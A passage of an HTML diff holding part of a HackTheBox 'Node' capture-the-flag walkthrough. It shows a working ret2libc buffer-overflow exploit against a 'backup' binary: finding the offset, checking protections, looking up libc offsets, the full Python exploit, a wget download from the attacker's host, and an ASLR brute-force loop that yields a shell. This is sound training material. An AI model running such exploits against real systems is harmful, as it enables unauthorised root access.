+        Take the value in EIP - <code>0Ar1</code> - and use msf-pattern_offset to find its position in the cyclic pattern.<br>
+            <div class="codebox">
+                root@city64<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Documents#&nbsp;msf-pattern_offset&nbsp;-q&nbsp;0Ar1<br>
+                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;512
+            </div>
+        </div><br>
+        <br>
+        The offset to overwrite EIP is 512 bytes.<br>
+        <br>
+        You can now write the start of your python exploit.<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;htb&nbsp;Node</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;'backup'&nbsp;exploit</span><br>
+                <br>
+                args&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"1&nbsp;"</span><br>
+                args&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&nbsp;"</span><br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">512</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;EIP</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">4</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;EIP</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;args&nbsp;+&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>8d) Check for protections</strong></h3><br>
+        Check for binary protections. I'm using gdb-peda - <a href="https://github.com/longld/peda">https://github.com/longld/peda</a><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;gdb&nbsp;-q&nbsp;backup<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;backup...<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>No&nbsp;debugging&nbsp;symbols&nbsp;found&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;backup<span style="color:#ff9d00;font-weight:700">)</span><br>
+                gdb-peda$&nbsp;checksec<br>
+                CANARY&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;disabled<br>
+                FORTIFY&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;disabled<br>
+                NX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ENABLED<br>
+                PIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;disabled<br>
+                RELRO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Partial
+            </div>
+        </div><br>
+        <br>
+        And check for ASLR on the target system.<br>
+        2 means ASLR is enabled.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>sys<span style="color:#ff9d00;font-weight:700">/</span>kernel<span style="color:#ff9d00;font-weight:700">/</span>randomize_va_space<br>
+                2
+            </div>
+        </div><br>
+        <br>
+        Protections enabled:<br>
+        ◇ NX - Non-Executable stack<br>
+        ◇ ASLR - Address Space Layout Randomisation<br>
+        <br>
+        To bypass NX and ASLR protections on a 32bit binary, we can use a ret2libc attack.<br>
+        <br>
+        <strong>What is ret2libc?</strong><br>
+        A ret2libc attack is where you overwrite EIP, and return to a function in libc.<br>
+        libc stores C functions, like system(), which executes system commands.<br>
+        If we can return to system() in libc, and provide “/bin/sh� string as an argument, we can spawn a shell.<br>
+        <br>
+        <strong>How to bypass ASLR?</strong><br>
+        On 32-bit systems, only 16 of the 32 address bits are available for randomisation, which means it's pretty trivial to bruteforce ASLR. We simply run the binary over and over again until the addresses for system() and a “/bin/sh� string match those in the binary.<br>
+        <br>
+        For a ret2libc attack we need:<br>
+        ◇ base address of libc in backup binary<br>
+        ◇ offset to system() function in libc<br>
+        ◇ offset to “/bin/sh� string in libc<br>
+        ◇ offset to exit() function in libc (so that the binary exits cleanly. not nescessary, but nice to do)<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>8e) Find libc offsets</strong></h3><br>
+        Find the base address of libc in the <code>backup</code> binary.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;ldd&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;libc<br>
+                ldd&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;libc<br>
+                libc.so.6&nbsp;=&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib32<span style="color:#ff9d00;font-weight:700">/</span>libc.so.6&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0xf7540000<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Grep <code>libc</code> - <code>/lib32/libc.so.6</code> - for the offset to <code>system()</code> - <code>0003a940</code>.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;readelf&nbsp;-s&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib32<span style="color:#ff9d00;font-weight:700">/</span>libc.so.6&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;system<br>
+                readelf&nbsp;-s&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib32<span style="color:#ff9d00;font-weight:700">/</span>libc.so.6&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;system<br>
+                &nbsp;&nbsp;&nbsp;245<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;00110820&nbsp;&nbsp;&nbsp;&nbsp;68&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;svcerr_systemerr@@GLIBC_2.0<br>
+                &nbsp;&nbsp;&nbsp;627<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0003a940&nbsp;&nbsp;&nbsp;&nbsp;55&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;__libc_system@@GLIBC_PRIVATE<br>
+                &nbsp;&nbsp;1457<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0003a940&nbsp;&nbsp;&nbsp;&nbsp;55&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;system@@GLIBC_2.0
+            </div>
+        </div><br>
+        <br>
+        Grep <code>libc</code> for the offset to exit() - <code>0002e7b0</code>.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;readelf&nbsp;-s&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib32<span style="color:#ff9d00;font-weight:700">/</span>libc.so.6&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
+                readelf&nbsp;-s&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib32<span style="color:#ff9d00;font-weight:700">/</span>libc.so.6&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
+                &nbsp;&nbsp;&nbsp;112<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0002eba0&nbsp;&nbsp;&nbsp;&nbsp;39&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;__cxa_at_quick_exit@@GLIBC_2.10<br>
+                &nbsp;&nbsp;&nbsp;141<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0002e7b0&nbsp;&nbsp;&nbsp;&nbsp;31&nbsp;FUNC&nbsp;&nbsp;&nbsp;&nbsp;GLOBAL&nbsp;DEFAULT&nbsp;&nbsp;&nbsp;13&nbsp;exit@@GLIBC_2.0<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Lastly, grep <code>libc</code> for a /bin/sh string - <code>15900b</code><br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib32<span style="color:#ff9d00;font-weight:700">/</span>libc.so.6&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib32<span style="color:#ff9d00;font-weight:700">/</span>libc.so.6&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                &nbsp;15900b&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>8f) Write final exploit</strong></h3><br>
+        At this point, we have everything we need for a ret2libc attack:<br>
+        ◇ libc base address = <code>0xf7540000</code> (will be different for you because of ASLR)<br>
+        ◇ offset to system() in libc = <code>0x0003a940</code><br>
+        ◇ offset to exit() in libc = <code>0x0002e7b0</code><br>
+        ◇ offset to /bin/sh string in libc = <code>0x0015900b</code><br>
+        <br>
+        We calculate the addresses of system(), exit() and the /bin/sh string in libc by adding the libc base address + the function offset.<br>
+        <br>
+        Write your final exploit :)<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;htb&nbsp;Node</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;‘backup’&nbsp;exploit</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;NX&nbsp;and&nbsp;ASLR&nbsp;enabled&nbsp;=&nbsp;ret2libc&nbsp;+&nbsp;bruteforce</span><br>
+                <br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
+                <br>
+                args&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"1&nbsp;"</span><br>
+                args&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&nbsp;"</span><br>
+                <br>
+                libc_base_addr&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0xf7540000</span><br>
+                <br>
+                libc_system_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x0003a940</span><br>
+                libc_exit_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x0002e7b0</span><br>
+                libc_binsh_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x0015900b</span><br>
+                <br>
+                libc_system_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;libc_base_addr&nbsp;+&nbsp;libc_system_offset)<br>
+                libc_exit_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;libc_base_addr&nbsp;+&nbsp;libc_exit_offset)<br>
+                libc_binsh_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;libc_base_addr&nbsp;+&nbsp;libc_binsh_offset)<br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">512</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;EIP</span><br>
+                payload&nbsp;+=&nbsp;libc_system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;EIP</span><br>
+                payload&nbsp;+=&nbsp;libc_exit_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;exit&nbsp;cleanly&nbsp;when&nbsp;leaving&nbsp;libc</span><br>
+                payload&nbsp;+=&nbsp;libc_binsh_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;system("/bin/sh")</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;args&nbsp;+&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-10" name="h3-10"></a><strong></strong>
+        <h3><strong>8g) Serve exploit script to target</strong></h3><br>
+        Start a python server on your attacking machine<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And download the file to the target.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.14.18<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>ex.py&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-11" name="h3-11"></a><strong></strong>
+        <h3><strong>8h) Exploit!</strong></h3><br>
+        Finally, you can exploit the binary.<br>
+        <br>
+        If ASLR wasn't enabled, the above script would work straight away.<br>
+        However, since ASLR is enabled, we need to bruteforce the script.<br>
+        <br>
+        This bash one-liner will run the exploit script in an infinite loop - <code>((i=0)); while true; do echo $i; /usr/local/bin/backup $(python ex.py); ((i=i+1)); done</code><br>
+        <br>
+        Run the exploit and wait patiently (shouldn't take longer than a minute or so)...<br>
+        Once you see a <code>#</code>, you have a shell.<br>
+            <div class="codebox">
+                tom@node<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>i=0<span style="color:#ff9d00;font-weight:700">));</span>&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;<span style="color:#ff9d00;font-weight:700">true;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#7f0044;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>backup&nbsp;$<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;ex.py<span style="color:#ff9d00;font-weight:700">);</span>&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>i=i+1<span style="color:#ff9d00;font-weight:700">));</span>&nbsp;<span style="color:#ff9d00;font-weight:700">done</span><br>
+                <br>
+                [...&nbsp;patience&nbsp;...]<br>
+                <br>
+                Segmentation&nbsp;fault&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>core&nbsp;dumped<span style="color:#ff9d00;font-weight:700">)</span><br>
+                133<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____________________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;_____________________________________________&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Secure&nbsp;Backup&nbsp;v1.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
